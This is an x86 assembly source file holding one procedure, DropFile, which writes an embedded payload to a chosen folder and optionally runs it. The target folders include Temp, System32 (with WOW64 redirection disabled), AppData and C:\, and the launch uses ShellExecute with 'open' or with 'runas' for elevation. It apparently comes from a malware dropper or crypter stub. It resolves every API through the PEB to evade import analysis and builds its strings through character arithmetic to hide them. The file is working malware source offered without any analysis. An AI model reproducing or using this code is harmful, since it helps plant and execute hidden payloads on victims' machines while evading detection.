proc DropFile Location:DWORD, File:DWORD, Size:DWORD, FileName:DWORD, FileAttributes:DWORD, Execute:DWORD
	local	Result:DWORD
	local	Path[MAX_PATH + 1]:WORD
	local	Path2:DWORD
	local	FileHandle:DWORD
	local	BytesWritten:DWORD
	local	Verb[10]:WORD
	local	Guid[16]:BYTE
	local	OldFsRedirection:DWORD

	mov		[Result], 0

	; Get path based on "Location" parameter
	cmp		[Location], 1
	je		.get_directory_temp
	cmp		[Location], 2
	je		.get_directory_executable
	cmp		[Location], 3
	je		.get_directory_windows
	cmp		[Location], 4
	je		.get_directory_system
	cmp		[Location], 5
	je		.get_directory_program_files
	cmp		[Location], 6
	je		.get_directory_program_data
	cmp		[Location], 7
	je		.get_directory_downloads
	cmp		[Location], 8
	je		.get_directory_desktop
	cmp		[Location], 9
	je		.get_directory_appdata_roaming
	cmp		[Location], 10
	je		.get_directory_appdata_local
	cmp		[Location], 11
	je		.get_directory_cdrive
	jmp		.ret

.get_directory_temp:
	; Get temp directory
	lea		eax, [Path]
	pebcall	PEB_Kernel32Dll, PEB_GetTempPathW, MAX_PATH, eax
	test	eax, eax
	jz		.ret
	jmp		.append_filename

.get_directory_executable:
	; Get executable filename
	lea		eax, [Path]
	pebcall	PEB_Kernel32Dll, PEB_GetModuleFileNameW, NULL, eax, MAX_PATH
	cmp		eax, 0
	jle		.ret

	; Get only the directory part of executable filename
	lea		eax, [Path]
	pebcall	PEB_ShlwapiDll, PEB_PathFindFileNameW, eax
	mov		word[eax], 0
	jmp		.append_filename

.get_directory_windows:
	; Get Windows directory
	lea		eax, [Path]
	pebcall	PEB_Shell32Dll, PEB_SHGetFolderPathW, NULL, CSIDL_WINDOWS, NULL, 0, eax
	test	eax, eax
	jnz		.ret
	jmp		.append_filename

.get_directory_system:
	; Disable redirection to C:\Windows\SysWOW64
	lea		eax, [OldFsRedirection]
	pebcall	PEB_Kernel32Dll, PEB_Wow64DisableWow64FsRedirection, eax

	; Get system directory
	lea		eax, [Path]
	pebcall	PEB_Shell32Dll, PEB_SHGetFolderPathW, NULL, CSIDL_SYSTEM, NULL, 0, eax
	test	eax, eax
	jnz		.ret
	jmp		.append_filename

.get_directory_program_files:
	; Get ProgramFiles directory
	lea		eax, [Path]
	pebcall	PEB_Shell32Dll, PEB_SHGetFolderPathW, NULL, CSIDL_PROGRAM_FILES, NULL, 0, eax
	test	eax, eax
	jnz		.ret
	jmp		.append_filename

.get_directory_program_data:
	; Get FOLDERID_ProgramData GUID
	lea		eax, [Guid]
	mov		dword[eax], 0x62ab5d82
	mov		dword[eax + 4], 0x4dc3fdc1
	mov		dword[eax + 8], 0x0d07dda9
	mov		dword[eax + 12], 0x975d491d

	; Get ProgramData directory
	lea		ebx, [Path2]
	pebcall	PEB_Shell32Dll, PEB_SHGetKnownFolderPath, eax, 0, NULL, ebx
	test	eax, eax
	jnz		.ret

	; Copy newly allocated string to [Path]
	lea		eax, [Path]
	pebcall	PEB_Kernel32Dll, PEB_lstrcpyW, eax, [Path2]
	jmp		.append_filename

.get_directory_downloads:
	; Get FOLDERID_Downloads GUID
	lea		eax, [Guid]
	mov		dword[eax], 0x374de290
	mov		dword[eax + 4], 0x4565123f
	mov		dword[eax + 8], 0xc4396491
	mov		dword[eax + 12], 0x7b465e92

	; Get downloads directory
	lea		ebx, [Path2]
	pebcall	PEB_Shell32Dll, PEB_SHGetKnownFolderPath, eax, 0, NULL, ebx
	test	eax, eax
	jnz		.ret

	; Copy newly allocated string to [Path]
	lea		eax, [Path]
	pebcall	PEB_Kernel32Dll, PEB_lstrcpyW, eax, [Path2]
	jmp		.append_filename

.get_directory_desktop:
	; Get desktop directory
	lea		eax, [Path]
	pebcall	PEB_Shell32Dll, PEB_SHGetFolderPathW, NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, eax
	test	eax, eax
	jnz		.ret
	jmp		.append_filename

.get_directory_appdata_roaming:
	; Get desktop directory
	lea		eax, [Path]
	pebcall	PEB_Shell32Dll, PEB_SHGetFolderPathW, NULL, CSIDL_APPDATA, NULL, 0, eax
	test	eax, eax
	jnz		.ret
	jmp		.append_filename

.get_directory_appdata_local:
	; Get desktop directory
	lea		eax, [Path]
	pebcall	PEB_Shell32Dll, PEB_SHGetFolderPathW, NULL, CSIDL_LOCAL_APPDATA, NULL, 0, eax
	test	eax, eax
	jnz		.ret
	jmp		.append_filename

.get_directory_cdrive:
	; Get C:\ directory
	lea		eax, [Path]
	; Load string: C:\
	mov		ebx, 'a'
	sub		bx, 30
	mov		word[eax + 0], bx ;C
	sub		bx, 9
	mov		word[eax + 2], bx ;:
	add		bx, 34
	mov		word[eax + 4], bx ;\
	mov		word[eax + 6], 0
	jmp		.append_filename

.append_filename:
	; Append filename to path
	lea		eax, [Path]
	pebcall	PEB_ShlwapiDll, PEB_PathCombineW, eax, eax, [FileName]

	; Delete file, if it exists
	lea		eax, [Path]
	pebcall	PEB_Kernel32Dll, PEB_DeleteFileW, eax

	; Create file
	lea		eax, [Path]
	pebcall	PEB_Kernel32Dll, PEB_CreateFileW, eax, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, [FileAttributes], NULL
	test	eax, eax
	jz		.ret
	mov		[FileHandle], eax

	; Write contents to file
	lea		eax, [BytesWritten]
	pebcall	PEB_Kernel32Dll, PEB_WriteFile, [FileHandle], [File], [Size], eax, NULL
	test	eax, eax
	jz		@f
	mov		[Result], 1
@@:

	; Close file
	pebcall	PEB_Kernel32Dll, PEB_CloseHandle, [FileHandle]

	; ShellExecute, if file was successfully created and [Execute] != 0
	cmp		[Result], 1
	jne		.ret
	cmp		[Execute], 0
	je		.ret

	; Get execute verb based on [Execute] parameter
	cmp		[Execute], 1
	je		.get_verb_open
	cmp		[Execute], 2
	je		.get_verb_runas
	jmp		.ret

.get_verb_open:
	; Verb "open"
	lea		eax, [Verb]
	; Load string: open
	mov		ebx, 'a'
	add		bx, 14
	mov		word[eax + 0], bx ;o
	inc		bx
	mov		word[eax + 2], bx ;p
	sub		bx, 11
	mov		word[eax + 4], bx ;e
	add		bx, 9
	mov		word[eax + 6], bx ;n
	mov		word[eax + 8], 0
	jmp		.execute

.get_verb_runas:
	; Verb "runas"
	lea		eax, [Verb]
	; Load string: runas
	mov		ebx, 'a'
	add		bx, 17
	mov		word[eax + 0], bx ;r
	add		bx, 3
	mov		word[eax + 2], bx ;u
	sub		bx, 7
	mov		word[eax + 4], bx ;n
	sub		bx, 13
	mov		word[eax + 6], bx ;a
	add		bx, 18
	mov		word[eax + 8], bx ;s
	mov		word[eax + 10], 0
	jmp		.execute

.execute:
	; Execute
	lea		eax, [Verb]
	lea		ebx, [Path]
	pebcall	PEB_Shell32Dll, PEB_ShellExecuteW, NULL, eax, ebx, NULL, NULL, SW_SHOW

.ret:
	mov		eax, [Result]
	ret
endp
